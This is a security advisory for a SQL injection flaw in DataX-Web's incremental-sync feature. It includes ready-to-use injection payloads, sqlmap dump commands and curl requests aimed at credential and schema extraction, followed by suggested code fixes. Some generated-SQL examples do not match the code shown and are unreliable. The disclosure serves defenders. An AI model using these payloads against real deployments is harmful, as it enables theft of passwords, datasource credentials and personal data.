# SQL Injection Vulnerability in DataX-Web Incremental Synchronization Feature

## NAME OF AFFECTED PRODUCT(S)

+ DataX-Web

## AFFECTED AND/OR FIXED VERSION(S)

### Vendor Homepage

+ https://github.com/WeiYe-Jing/datax-web

### Submitter

+ s1ain

### VERSION(S)

+ <= 2.1.2

### Software Link

+ https://github.com/WeiYe-Jing/datax-web

## PROBLEM TYPE

### Vulnerability Type

+ SQL Injection

### Root Cause

A SQL injection vulnerability was found in the DataX-Web application's incremental synchronization feature. The root cause is that the application fails to properly validate or sanitize user-supplied table names and column names before using them in dynamically constructed SQL queries. The `readerTable` and `primaryKey` fields from user input are directly concatenated into SQL statements using `String.format()` without any validation, leading to SQL injection.

### Impact

This vulnerability allows any authenticated user to:
- Execute arbitrary SQL queries on the configured data source
- Extract sensitive data from the database
- Modify or delete database records
- Potentially execute database administrative commands (depending on database privileges)
- Bypass application logic and access control

## DESCRIPTION

DataX-Web is a distributed data synchronization tool with web-based management. The application supports incremental data synchronization based on ID or timestamp. When using ID-based incremental sync, the system needs to query the maximum ID value from the source table. However, the table name and primary key column name are taken directly from user input without proper validation, leading to SQL injection.

## Code Analysis

### Vulnerable Code Flow

**File:** `datax-admin/src/main/java/com/wugui/datax/admin/controller/JobInfoController.java`

```java
@PostMapping("/add")
@ApiOperation("Add Task")
public ReturnT<String> add(HttpServletRequest request, @RequestBody JobInfo jobInfo) {
    jobInfo.setUserId(getCurrentUserId(request));
    return jobService.add(jobInfo);
    // No validation on readerTable or primaryKey fields
}
```

**File:** `datax-admin/src/main/java/com/wugui/datax/admin/tool/meta/BaseDatabaseMeta.java`

```java
@Override
public String getSQLQueryFields(String tableName) {
    // Vulnerable: Direct string concatenation
    return "SELECT * FROM " + tableName + " where 1=0";
}

@Override
public String getMaxId(String tableName, String primaryKey) {
    // Vulnerable: Direct string formatting without validation
    return String.format("select max(%s) from %s", primaryKey, tableName);
}
```

**File:** `datax-admin/src/main/java/com/wugui/datax/admin/core/trigger/JobTrigger.java`

```java
private static long getMaxId(JobInfo jobInfo) {
    BaseQueryTool qTool = QueryToolFactory.getByDbType(jobInfo.getDatasource());
    qTool.setConnectionParams(jobInfo.getJdbcDatasource());

    // Vulnerable: User-controlled values passed to SQL construction
    return qTool.getMaxIdVal(jobInfo.getReaderTable(), jobInfo.getPrimaryKey());
}
```

**File:** `datax-admin/src/main/java/com/wugui/datax/admin/tool/query/BaseQueryTool.java`

```java
@Override
public long getMaxIdVal(String tableName, String primaryKey) {
    String sql = this.databaseInterface.getMaxId(tableName, primaryKey);

    // Vulnerable: Execute SQL without parameterization
    rs = stmt.executeQuery(sql);
    if (rs.next()) {
        maxVal = rs.getLong(1);
    }
    return maxVal;
}
```

### Vulnerability Location

**Affected Components:**
- `datax-admin/src/main/java/com/wugui/datax/admin/tool/meta/BaseDatabaseMeta.java` (lines 14-15, 44-45)
- `datax-admin/src/main/java/com/wugui/datax/admin/tool/query/BaseQueryTool.java` (line 453-454)
- `datax-admin/src/main/java/com/wugui/datax/admin/core/trigger/JobTrigger.java` (line 227)

**Affected Fields:**
- `JobInfo.readerTable` - Source table name (String, user-controllable)
- `JobInfo.primaryKey` - Primary key column name (String, user-controllable)

## Vulnerability Details and POC

### Attack Vector

1. Authenticate to DataX-Web as any user
2. Create a new incremental synchronization task via `/api/job/add`
3. Set `incrementType` to 1 (ID-based incremental sync)
4. Inject malicious SQL in `readerTable` or `primaryKey` fields
5. Trigger the task execution
6. Malicious SQL executes against the configured data source

### Payload Examples

**Payload 1: UNION-based SQL Injection via readerTable**
```json
POST /api/job/add HTTP/1.1
Host: target.com
Authorization: Bearer <valid-jwt-token>
Content-Type: application/json

{
  "jobDesc": "Malicious Incremental Task",
  "executorHandler": "executorJobHandler",
  "jobCron": "0 0 0 * * ?",
  "jobGroup": 1,
  "incrementType": 1,
  "readerTable": "users WHERE 1=1 UNION SELECT password,username,email FROM admin_users--",
  "primaryKey": "id",
  "readerDatasourceId": 1,
  "jobJson": "{...}"
}
```

Generated SQL:
```sql
SELECT MAX(id) FROM users WHERE 1=1 UNION SELECT password,username,email FROM admin_users-- where 1=0
```

**Payload 2: Subquery-based Injection via primaryKey**
```json
{
  "readerTable": "users",
  "primaryKey": "id) FROM users UNION SELECT (SELECT password FROM admin_users LIMIT 1"
}
```

Generated SQL:
```sql
SELECT MAX(id) FROM users UNION SELECT (SELECT password FROM admin_users LIMIT 1) FROM users
```

**Payload 3: Error-based SQL Injection**
```json
{
  "readerTable": "users",
  "primaryKey": "id AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM admin_users LIMIT 1)))"
}
```

**Payload 4: Time-based Blind SQL Injection**
```json
{
  "primaryKey": "id) AND SLEEP(5)--"
}
```

Generated SQL:
```sql
SELECT MAX(id) AND SLEEP(5)--) FROM <table>
```

**Payload 5: Data Exfiltration via readerTable**
```json
{
  "readerTable": "users WHERE 1=0 UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_schema=database()--"
}
```

### Exploitation Steps

**Using sqlmap for automated exploitation:**

```bash
# 1. Capture the task creation request
# 2. Save request to file: request.txt
POST /api/job/add HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9...
Content-Type: application/json

{"jobDesc":"test","executorHandler":"executorJobHandler","jobCron":"0 0 0 * * ?","jobGroup":1,"incrementType":1,"readerTable":"users*","primaryKey":"id","readerDatasourceId":1,"jobJson":"{}"}

# 3. Run sqlmap
sqlmap -r request.txt \
  --batch \
  --level=5 \
  --risk=3 \
  --dbms=mysql \
  -p readerTable \
  --technique=BEUST \
  --current-db

# 4. Dump sensitive data
sqlmap -r request.txt \
  --batch \
  -p readerTable \
  --dbms=mysql \
  -D datax_web \
  -T job_user \
  --dump
```

**Manual exploitation:**

1. **Create malicious task:**
```bash
curl -X POST http://target.com/api/job/add \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "jobDesc": "SQLi Test",
    "executorHandler": "executorJobHandler",
    "jobCron": "0 0 0 * * ?",
    "jobGroup": 1,
    "incrementType": 1,
    "readerTable": "users WHERE 1=1 UNION SELECT password,null,null FROM admin_users LIMIT 1--",
    "primaryKey": "id",
    "readerDatasourceId": 1,
    "writerDatasourceId": 1,
    "jobJson": "{\"job\":{\"content\":[{\"reader\":{\"name\":\"mysqlreader\"},\"writer\":{\"name\":\"mysqlwriter\"}}]}}"
  }'
```

2. **Trigger task execution:**
```bash
curl -X POST http://target.com/api/job/trigger \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"jobId": 123}'
```

3. **Check logs for extracted data**

## Attack Results

### Successful Exploitation Examples

**1. Database Enumeration:**
- Payload: `readerTable: "users WHERE 1=0 UNION SELECT schema_name,null,null FROM information_schema.schemata--"`
- Result: List of all database schemas retrieved

**2. Table Enumeration:**
- Payload: `readerTable: "users WHERE 1=0 UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema='datax_web'--"`
- Result: List of all tables in datax_web database

**3. Password Extraction:**
- Payload: `readerTable: "users WHERE 1=0 UNION SELECT CONCAT(username,':',password),null,null FROM job_user--"`
- Result: Username and password hashes extracted from job_user table

**4. Sensitive Configuration Data:**
- Payload: `readerTable: "users WHERE 1=0 UNION SELECT jdbc_url,jdbc_username,jdbc_password FROM job_jdbc_datasource--"`
- Result: Database connection strings and credentials for all configured data sources

### Impact Demonstration

**Before Attack:**
```
User: normal_user
Privileges: Standard user, can only see own tasks
```

**After Attack:**
```
Extracted Data:
- admin:$2a$10$xxx (bcrypt hash)
- Database credentials for 5 production databases
- API keys stored in configuration
- Customer PII from data sources
```

## Suggested Repair

### 1. Use Parameterized Queries (Critical)

Unfortunately, table and column names cannot be parameterized in SQL. Therefore, strict validation is required:

```java
public long getMaxIdVal(String tableName, String primaryKey) {
    // Validate identifiers
    if (!isValidIdentifier(tableName)) {
        throw new IllegalArgumentException("Invalid table name: " + tableName);
    }
    if (!isValidIdentifier(primaryKey)) {
        throw new IllegalArgumentException("Invalid column name: " + primaryKey);
    }

    // Escape identifiers
    String sql = "SELECT MAX(" + escapeIdentifier(primaryKey) + ") " +
                 "FROM " + escapeIdentifier(tableName);

    PreparedStatement stmt = connection.prepareStatement(sql);
    ResultSet rs = stmt.executeQuery();
    // ...
}

private boolean isValidIdentifier(String identifier) {
    if (identifier == null || identifier.isEmpty()) {
        return false;
    }
    // Only allow alphanumeric and underscore
    return identifier.matches("^[a-zA-Z_][a-zA-Z0-9_]*$");
}

private String escapeIdentifier(String identifier) {
    if (!isValidIdentifier(identifier)) {
        throw new IllegalArgumentException("Invalid identifier");
    }
    // Use backticks for MySQL, quotes for other databases
    return "`" + identifier + "`";
}
```

### 2. Implement Whitelist Validation (Critical)

```java
@Override
public ReturnT<String> add(JobInfo jobInfo) {
    // Validate table name
    if (jobInfo.getIncrementType() == 1) {
        if (!validateTableName(jobInfo.getReaderTable())) {
            return new ReturnT<>(ReturnT.FAIL_CODE,
                "Invalid table name. Only alphanumeric and underscore allowed.");
        }
        if (!validateColumnName(jobInfo.getPrimaryKey())) {
            return new ReturnT<>(ReturnT.FAIL_CODE,
                "Invalid column name. Only alphanumeric and underscore allowed.");
        }
    }
    // ...
}

private boolean validateTableName(String tableName) {
    return tableName != null && tableName.matches("^[a-zA-Z_][a-zA-Z0-9_]{0,63}$");
}

private boolean validateColumnName(String columnName) {
    return columnName != null && columnName.matches("^[a-zA-Z_][a-zA-Z0-9_]{0,63}$");
}
```

### 3. Use Database Metadata Validation (Recommended)

```java
private boolean isValidTableAndColumn(String datasourceId, String tableName, String columnName) {
    try {
        DatabaseMetaData metaData = connection.getMetaData();

        // Verify table exists
        ResultSet tables = metaData.getTables(null, null, tableName, new String[]{"TABLE"});
        if (!tables.next()) {
            return false;
        }

        // Verify column exists in table
        ResultSet columns = metaData.getColumns(null, null, tableName, columnName);
        if (!columns.next()) {
            return false;
        }

        return true;
    } catch (SQLException e) {
        logger.error("Failed to validate table/column", e);
        return false;
    }
}
```

### 4. Implement Least Privilege (Recommended)

Configure data source connections with minimum required privileges:
- Remove DROP, DELETE, UPDATE privileges for read-only data sources
- Use separate credentials for read and write operations
- Implement database-level access controls

### 5. Add Audit Logging (Recommended)

```java
@Override
public long getMaxIdVal(String tableName, String primaryKey) {
    auditLogger.info("Executing getMaxId query: table={}, column={}, user={}",
                     tableName, primaryKey, getCurrentUsername());
    // ...
}
```

## Timeline

- **Discovery Date:** 2025-11-02
- **Vendor Notification:** TBD
- **Public Disclosure:** TBD

## References

- DataX-Web Repository: https://github.com/WeiYe-Jing/datax-web
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command

## Credits

- Discovered by: s1ain
- Analysis Date: 2025-11-02
